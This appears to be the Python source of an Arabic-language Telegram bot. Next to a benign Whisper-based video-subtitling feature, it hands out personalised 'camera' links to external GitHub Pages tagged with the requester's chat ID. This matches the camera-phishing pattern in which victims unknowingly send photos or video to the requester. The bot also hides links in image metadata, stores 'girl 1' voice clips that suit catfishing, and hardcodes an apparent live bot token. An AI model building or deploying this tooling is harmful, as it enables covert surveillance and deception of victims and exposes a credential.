import os
import json
import urllib3
import telebot
from telebot import types
from PIL import Image, PngImagePlugin
import threading
import http.server
import subprocess
import whisper
from deep_translator import GoogleTranslator

# إيقاف تحذيرات الشهادات لضمان استقرار الاتصال
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إعداد توكن البوت الخاص بك
BOT_TOKEN = os.getenv("BOT_TOKEN", "8446745973:AAFbl0cHMVXW4ZHvUQHnuWqJjf62597qBl0")
bot = telebot.TeleBot(BOT_TOKEN)

# مسار قاعدة بيانات الأصوات الآمن على Railway
DB_FILE = "/tmp/voice_db.json" if os.path.exists("/tmp") else "voice_db.json"

PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId/"

user_states = {}
user_data = {}

# --- سيرفر وهمي لإبقاء Railway مستقراً ويمنع الـ Crash ---
def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server_address = ('', port)
    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    print(f"📡 السيرفر الوهمي مستقر ويعمل على المنفذ: {port}")
    httpd.serve_forever()

# --- إدارة قاعدة بيانات الأصوات المحمية ---
def load_db():
    if not os.path.exists(DB_FILE) or os.path.getsize(DB_FILE) == 0:
        return {}
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try: return json.load(f)
        except: return {}

def save_db(db):
    try:
        dir_name = os.path.dirname(DB_FILE)
        if dir_name and not os.path.exists(dir_name):
            os.makedirs(dir_name, exist_ok=True)
        with open(DB_FILE, 'w', encoding='utf-8') as f: 
            json.dump(db, f, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f"تحذير حفظ قاعدة البيانات: {e}")

# --- دالة حقن الرابط في الصورة ---
def hide_link_in_metadata(image_path, link, output_path):
    try:
        img = Image.open(image_path).convert("RGB")
        meta = PngImagePlugin.PngInfo()
        meta.add_text("URL_LINK", link)
        img.save(output_path, "PNG", pnginfo=meta)
    except Exception as e:
        print(f"خطأ ميتاداتا: {e}")

# --- دالة تحويل التوقيت إلى صيغة SRT ---
def time_to_srt_format(seconds_total):
    hours = int(seconds_total // 3600)
    minutes = int((seconds_total % 3600) // 60)
    seconds = int(seconds_total % 60)
    milliseconds = int((seconds_total - int(seconds_total)) * 1000)
    return f"{hours:02d}:{minutes:02d}:{seconds:02d},{milliseconds:03d}"

# --- لوحة التحكم بالترتيب العمودي الثابت المحدثة ---
def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("🔒 حقن رابط في صورة", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu"),
        types.InlineKeyboardButton("🎬 قسم ترجمة الفيديوهات", callback_data="translate_video_start")
    )
    return markup

# --- استقبال أمر البدء (الرسالة الترحيبية المعتمدة كما كانت) ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = "🤖 **المطور سيف الدين يرحب بك في البوت الشامل المطور!**\n\nالرجاء اختيار الخدمة المطلوبة من القائمة العمودية بالأسفل 👇"
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=get_main_keyboard())

# --- معالجة الضغط على الأزرار ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    db = load_db()

    if call.data == "inject_start":
        user_states[chat_id] = "waiting_for_image_inject"
        bot.send_message(chat_id, "📸 **أرسل الصورة الآن لحقن الرابط داخل بياناتها:**", parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        
    elif call.data == "translate_video_start":
        user_states[chat_id] = "waiting_for_video_translation"
        bot.send_message(chat_id, "🎬 **من فضلك قم بإرسال مقطع الفيديو الآن لترجمته فوراً وحرق اللغات الثلاث عليه:**", parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        
    elif call.data == "get_photo_link":
        link = f"{PHOTO_PAGE_URL}?chatId={chat_id}"
        bot.send_message(chat_id, f"🔗 رابط كاميرا الصور الخاص بك:\n`{link}`", parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        
    elif call.data == "get_video_link":
        link = f"{VIDEO_PAGE_URL}?chatId={chat_id}"
        bot.send_message(chat_id, f"🔗 رابط كاميرا الفيديو الخاص بك:\n`{link}`", parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        
    elif call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"))
        markup.add(types.InlineKeyboardButton("🔙 عودة للقائمة الرئيسية", callback_data="main_menu"))
        bot.edit_message_text("اختر المجلد المطلوب:", chat_id=chat_id, message_id=msg_id, reply_markup=markup)
        
    elif call.data == "girl_1_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        for i in range(1, 11):
            name = f"مقطع {i}"
            status_emoji = "🎵" if name in db else "⚪"
            markup.add(types.InlineKeyboardButton(f"{status_emoji} {name}", callback_data=f"play:{name}"))
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
        bot.edit_message_text("📂 مقاطع الفتاة 1 الكاملة والمتاحة للمعاينة:", chat_id=chat_id, message_id=msg_id, reply_markup=markup)
        
    elif call.data == "main_menu":
        welcome_text = "🤖 **المطور سيف الدين يرحب بك في البوت الشامل المطور!**\n\nالرجاء اختيار الخدمة المطلوبة من القائمة العمودية بالأسفل 👇"
        bot.edit_message_text(welcome_text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=get_main_keyboard())
        
    elif call.data.startswith("play:"):
        name = call.data.split(":")[1]
        file_id = db.get(name)
        if file_id:
            try: 
                bot.send_voice(chat_id, file_id)
                bot.answer_callback_query(call.id)
            except: 
                bot.answer_callback_query(call.id, "❌ خطأ استدعاء الصوت من السيرفر.")
        else: 
            bot.answer_callback_query(call.id, f"⚠️ {name} فارغ! أرسل ملف فويس الآن لحفظه في هذا المكان.", show_alert=True)

# --- المعالجة الآمنة لجميع الوسائط المرفوعة وفك الترجمة ---
@bot.message_handler(content_types=['photo', 'text', 'voice', 'video'])
def handle_all_media(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)

    # 🎬 محرك الترجمة عند إرسال فيديو وتفعيل الحالة الخاصة به
    if message.video and state == "waiting_for_video_translation":
        status_msg = bot.reply_to(message, "📥 تم استلام الفيديو على السيرفر! جاري تحميله والبدء بمعالجة اللغات الثلاث...")
        tmp_dir = "/tmp" if os.path.exists("/tmp") else "."
        video_input = os.path.join(tmp_dir, f"video_{chat_id}.mp4")
        audio_path = os.path.join(tmp_dir, f"audio_{chat_id}.wav")
        srt_path = os.path.join(tmp_dir, f"subs_{chat_id}.srt")
        video_output = os.path.join(tmp_dir, f"output_{chat_id}.mp4")
        
        try:
            file_info = bot.get_file(message.video.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open(video_input, 'wb') as f: 
                f.write(downloaded_file)
                
            bot.edit_message_text("🧠 جاري تفكيك تيار الصوت والاستماع عبر ذكاء Whisper الاصطناعي...", chat_id=chat_id, message_id=status_msg.message_id)
            
            # استخراج الصوت النقي متوافق مع نمط Whisper
            subprocess.run(['ffmpeg', '-y', '-i', video_input, '-vn', '-acodec', 'pcm_s16le', '-ar', '16000', '-ac', '1', audio_path], check=True)
            
            # تحميل النموذج ومعالجة الصوت
            model = whisper.load_model("base")
            result = model.transcribe(audio_path)
            
            bot.edit_message_text("🌐 جاري الترجمة والدمج: (العربية 🇸🇦 - الفرنسية 🇫🇷 - الإنجليزية 🇬🇧)...", chat_id=chat_id, message_id=status_msg.message_id)
            
            srt_content = ""
            for segment in result['segments']:
                start_time = time_to_srt_format(segment['start'])
                end_time = time_to_srt_format(segment['end'])
                original_text = segment['text'].strip()
                
                try:
                    text_ar = GoogleTranslator(source='auto', target='ar').translate(original_text)
                    text_fr = GoogleTranslator(source='auto', target='fr').translate(original_text)
                    text_en = GoogleTranslator(source='auto', target='en').translate(original_text)
                except Exception:
                    text_ar, text_fr, text_en = original_text, original_text, original_text
                
                # دمج الأسطر الثلاثة فوق بعضها
                combined_text = f"{text_ar}\\n{text_fr}\\n{text_en}"
                srt_content += f"{segment['id'] + 1}\n{start_time} --> {end_time}\n{combined_text}\n\n"
                
            with open(srt_path, "w", encoding="utf-8") as f: 
                f.write(srt_content)
                
            bot.edit_message_text("🎬 جاري حرق الترجمة داخل الفيديو بخلفية مريحة للعين...", chat_id=chat_id, message_id=status_msg.message_id)
            
            # حرق النص المدمج باستخدام فلاتر ffmpeg (اللون الأصفر، خلفية سوداء شفافة BorderStyle=3)
            ffmpeg_cmd = [
                'ffmpeg', '-y', '-i', video_input, 
                '-vf', f"subtitles={srt_path}:force_style='Fontname=Arial,Fontsize=14,PrimaryColour=&H00FFFF,BorderStyle=3,Alignment=2,MarginV=15'", 
                '-c:a', 'copy', video_output
            ]
            subprocess.run(ffmpeg_cmd, check=True)
            
            bot.edit_message_text("✨ اكتمل البناء! جاري إرسال الفيديو المترجم...", chat_id=chat_id, message_id=status_msg.message_id)
            with open(video_output, "rb") as video_file:
                bot.send_video(chat_id, video_file, caption="🎉 تم دمج الترجمة المتزامنة بـ 3 لغات بنجاح!")
            
            user_states[chat_id] = None
                
        except Exception as e:
            bot.edit_message_text(f"❌ حدث خطأ أثناء المعالجة:\n`{str(e)}`", chat_id=chat_id, message_id=status_msg.message_id)
            
        finally:
            for path in [video_input, audio_path, srt_path, video_output]:
                if os.path.exists(path): os.remove(path)

    # استقبال وحفظ فويسات الفتاة 1
    elif message.voice:
        db = load_db()
        next_slot = len(db) + 1
        if next_slot > 10: 
            db = {} 
            next_slot = 1
        name = f"مقطع {next_slot}"
        db[name] = message.voice.file_id
        save_db(db)
        bot.send_message(chat_id, f"✅ **تم حفظ وتحديث ({name}) بنجاح داخل مجلد الفتاة 1!**", parse_mode="Markdown")
        
    # خطوة استقبال الصورة للحقن
    elif state == "waiting_for_image_inject" and message.photo:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        img_path = os.path.join("/tmp" if os.path.exists("/tmp") else ".", f"img_{chat_id}.png")
        with open(img_path, 'wb') as f: f.write(downloaded)
        user_data[chat_id] = img_path
        user_states[chat_id] = "waiting_for_link"
        bot.send_message(chat_id, "📥 **تم حفظ الصورة بنجاح! أرسل الآن الرابط المراد حقنه داخل ميتاداتا الصورة:**", parse_mode="Markdown")
        
    # خطوة استقبال الرابط وإتمام الحقن
    elif state == "waiting_for_link" and message.text:
        img_path = user_data.get(chat_id)
        out_path = os.path.join("/tmp" if os.path.exists("/tmp") else ".", f"out_{chat_id}.png")
        hide_link_in_metadata(img_path, message.text, out_path)
        if os.path.exists(out_path):
            with open(out_path, 'rb') as f: 
                bot.send_photo(chat_id, f, caption=f"✅ تم حقن الميتاداتا بنجاح!\nالرابط: {message.text}")
        user_states[chat_id] = None
        if os.path.exists(img_path): os.remove(img_path)
        if os.path.exists(out_path): os.remove(out_path)

if __name__ == '__main__':
    # تشغيل السيرفر الوهمي في الخلفية
    threading.Thread(target=run_dummy_server, daemon=True).start()
    
    print("🚀 تم تشغيل البوت الشامل المطور والمصلح بالكامل...")
    bot.polling(none_stop=True, interval=0, timeout=40)
